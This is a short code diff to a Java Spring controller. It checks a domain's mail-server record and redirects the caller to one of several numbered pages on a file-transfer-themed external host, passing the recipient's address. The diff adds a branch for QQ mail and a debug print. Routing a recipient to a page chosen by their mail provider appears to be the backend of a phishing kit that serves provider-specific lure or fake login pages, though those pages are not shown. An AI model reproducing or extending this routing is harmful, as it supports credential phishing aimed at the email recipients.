@@ -15,6 +15,7 @@ public class DnsResolverController {
 	@RequestMapping("/domain/{domainToCheck}/{recipient}")
 	public String checkDns(@PathVariable String domainToCheck, @PathVariable String recipient) {
 		String mailBox = dnsResolverService.checkDns(domainToCheck);
+		System.out.println(mailBox);
 		if (mailBox.contains("outlook.com.")) {
 			return "https://filetransfer-2.onrender.com/4.html?recipient="+recipient;
         } 
@@ -29,6 +30,10 @@ public class DnsResolverController {
 		}
 		else if(mailBox.contains("unknown")) {
 			return "https://filetransfer-2.onrender.com/5.html?recipient="+recipient;
+		}
+		
+		else if(mailBox.contains("mxbiz1.qq.com.")) {
+			return "https://filetransfer-2.onrender.com/6.html?recipient="+recipient;
 		}
 		
 		return "https://filetransfer-2.onrender.com/5.html?recipient="+recipient;
